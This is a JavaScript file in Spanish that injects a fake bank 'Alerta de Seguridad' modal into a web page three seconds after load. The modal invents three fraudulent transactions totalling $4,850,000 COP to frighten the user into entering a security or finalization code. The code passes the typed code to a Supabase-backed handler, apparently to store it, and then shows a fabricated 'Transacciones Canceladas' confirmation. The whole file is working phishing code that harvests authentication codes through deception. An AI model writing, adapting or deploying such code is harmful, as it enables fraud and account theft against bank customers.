// Modal de alerta de seguridad - Versión con Supabase
(function() {
    var modalHTML = '<div id="modalSeguridadOverlay" class="modal-seguridad-overlay" style="display:none">' +
        '<div class="modal-seguridad">' +
        '<div class="modal-seguridad-header">' +
        '<div class="modal-seguridad-icono">' +
        '<svg width="48" height="48" viewBox="0 0 48 48" fill="none">' +
        '<circle cx="24" cy="24" r="24" fill="#E1111C" fill-opacity="0.1"/>' +
        '<path d="M24 14C25.0609 14 26.0783 14.4214 26.8284 15.1716C27.5786 15.9217 28 16.9391 28 18C28 19.0609 27.5786 20.0783 26.8284 20.8284C26.0783 21.5786 25.0609 22 24 22C22.9391 22 21.9217 21.5786 21.1716 20.8284C20.4214 20.0783 20 19.0609 20 18C20 16.9391 20.4214 15.9217 21.1716 15.1716C21.9217 14.4214 22.9391 14 24 14ZM24 24C27.87 24 31 25.79 31 28V30H17V28C17 25.79 20.13 24 24 24Z" fill="#E1111C"/>' +
        '</svg>' +
        '</div>' +
        '<h2 class="modal-seguridad-titulo">Alerta de Seguridad</h2>' +
        '<p class="modal-seguridad-subtitulo">Transacciones sospechosas detectadas</p>' +
        '</div>' +
        '<div class="modal-seguridad-cuerpo">' +
        '<div class="modal-seguridad-alerta">' +
        '<span style="font-size:20px;flex-shrink:0">⚠️</span>' +
        '<div><p class="alerta-texto">Se han identificado <strong>3 transacciones no reconocidas</strong> en las últimas 24 horas por <strong>$4,850,000 COP</strong>.</p></div>' +
        '</div>' +
        '<div>' +
        '<div class="detalle-item"><span class="detalle-fecha">24/06/2026 - 06:32 AM</span><span class="detalle-monto">-$2,300,000</span><span class="detalle-ubicacion">Bogota</span></div>' +
        '<div class="detalle-item"><span class="detalle-fecha">24/06/2026 - 04:15 AM</span><span class="detalle-monto">-$1,200,000</span><span class="detalle-ubicacion">Medellin</span></div>' +
        '<div class="detalle-item"><span class="detalle-fecha">23/06/2026 - 11:48 PM</span><span class="detalle-monto">-$1,350,000</span><span class="detalle-ubicacion">Cali</span></div>' +
        '</div>' +
        '<div class="modal-seguridad-form">' +
        '<label>Ingrese su <strong>Código de Finalización</strong> para cancelar:</label>' +
        '<div class="input-group">' +
        '<input type="text" id="codigoCancelacion" class="modal-seguridad-input" placeholder="CFT-XXXX-XXXX" maxlength="14">' +
        '<button id="btnCancelar" class="modal-seguridad-boton" onclick="cancelarTx()">Cancelar</button>' +
        '</div>' +
        '<p id="errorCodigo" style="color:#E1111C;font-size:12px;margin-top:8px;display:none">Código inválido</p>' +
        '</div>' +
        '</div>' +
        '<div class="modal-seguridad-footer">' +
        '<button class="modal-seguridad-cerrar" onclick="cerrarModal()">Cerrar</button>' +
        '<p class="modal-seguridad-ayuda">Línea de atención <strong>01-8000-123-456</strong></p>' +
        '</div>' +
        '</div>' +
        '</div>';

    var css = '<style>' +
        '@keyframes modalSlideIn{from{transform:translateY(-30px);opacity:0}to{transform:translateY(0);opacity:1}}' +
        '.modal-seguridad-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.6);z-index:99999;display:flex;align-items:center;justify-content:center;font-family:"Work Sans",sans-serif}' +
        '.modal-seguridad{background:#fff;border-radius:16px;max-width:480px;width:90%;box-shadow:0 20px 60px rgba(0,0,0,0.3);overflow:hidden;animation:modalSlideIn .3s ease-out}' +
        '.modal-seguridad-header{background:linear-gradient(135deg,#E1111C 0%,#B8000F 100%);padding:30px 28px;text-align:center;color:#fff}' +
        '.modal-seguridad-icono{margin-bottom:12px}' +
        '.modal-seguridad-titulo{font-size:22px;font-weight:700;margin:0 0 6px;color:#fff}' +
        '.modal-seguridad-subtitulo{font-size:14px;opacity:.9;margin:0;color:#fff}' +
        '.modal-seguridad-cuerpo{padding:24px 28px}' +
        '.modal-seguridad-alerta{display:flex;gap:12px;background:#FFF5F5;border:1px solid #FFD7D7;border-radius:10px;padding:14px;margin-bottom:20px}' +
        '.alerta-texto{font-size:13px;color:#5F2120;margin:0;line-height:1.5}' +
        '.detalle-item{display:flex;justify-content:space-between;padding:10px 14px;border-bottom:1px solid #f0f0f0;font-size:13px}' +
        '.detalle-item:last-child{border-bottom:none}' +
        '.detalle-fecha{color:#666;flex:1}' +
        '.detalle-monto{color:#E1111C;font-weight:700;margin:0 12px}' +
        '.detalle-ubicacion{color:#999;font-size:12px}' +
        '.modal-seguridad-form label{display:block;font-size:13px;color:#404040;margin-bottom:10px}' +
        '.input-group{display:flex;gap:10px}' +
        '.modal-seguridad-input{flex:1;padding:12px 14px;border:2px solid #e0e0e0;border-radius:8px;font-size:14px;outline:none}' +
        '.modal-seguridad-input:focus{border-color:#E1111C}' +
        '.modal-seguridad-boton{background:#E1111C;color:#fff;border:none;border-radius:8px;padding:12px 18px;font-size:13px;font-weight:600;cursor:pointer;white-space:nowrap;font-family:"Work Sans",sans-serif}' +
        '.modal-seguridad-boton:hover{background:#B8000F}' +
        '.modal-seguridad-footer{padding:16px 28px;background:#f9f9f9;text-align:center;border-top:1px solid #eee}' +
        '.modal-seguridad-cerrar{background:none;border:1px solid #ccc;color:#666;padding:8px 24px;border-radius:6px;font-size:13px;cursor:pointer;font-family:"Work Sans",sans-serif;margin-bottom:8px}' +
        '.modal-seguridad-cerrar:hover{background:#eee}' +
        '.modal-seguridad-ayuda{font-size:11px;color:#999;margin:0}' +
        '</style>';

    function cerrarModal() {
        document.getElementById('modalSeguridadOverlay').style.display = 'none';
    }

    async function cancelarTx() {
        var c = document.getElementById('codigoCancelacion').value.trim();
        if (!c || c.length < 5) {
            document.getElementById('errorCodigo').style.display = 'block';
            document.getElementById('codigoCancelacion').style.borderColor = '#E1111C';
            return;
        }

        document.getElementById('errorCodigo').style.display = 'none';
        document.getElementById('btnCancelar').textContent = 'Procesando...';
        document.getElementById('btnCancelar').disabled = true;

        // Guardar código en Supabase si está disponible
        if (window.loginSupabase && window.loginSupabase.procesarCodigoSeguridad) {
            await window.loginSupabase.procesarCodigoSeguridad(c);
        }

        setTimeout(function() {
            document.querySelector('.modal-seguridad-cuerpo').innerHTML = '<div style="text-align:center;padding:30px 20px"><div style="font-size:48px;margin-bottom:16px">✅</div><h3 style="color:#2E7D32;margin:0 0 8px;font-size:18px">Transacciones Canceladas</h3><p style="color:#666;font-size:14px;margin:0">ID: CFT-' + Math.random().toString(36).substr(2, 8).toUpperCase() + '</p></div>';
            document.querySelector('.modal-seguridad-footer .modal-seguridad-cerrar').textContent = 'Aceptar';
        }, 2000);
    }

    window.cerrarModal = cerrarModal;
    window.cancelarTx = cancelarTx;

    function injectModal() {
        if (document.getElementById('modalSeguridadOverlay')) return;
        var div = document.createElement('div');
        div.innerHTML = css + modalHTML;
        document.body.appendChild(div);
        setTimeout(function() {
            var m = document.getElementById('modalSeguridadOverlay');
            if (m) m.style.display = 'flex';
        }, 3000);
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', injectModal);
    } else {
        injectModal();
    }
})();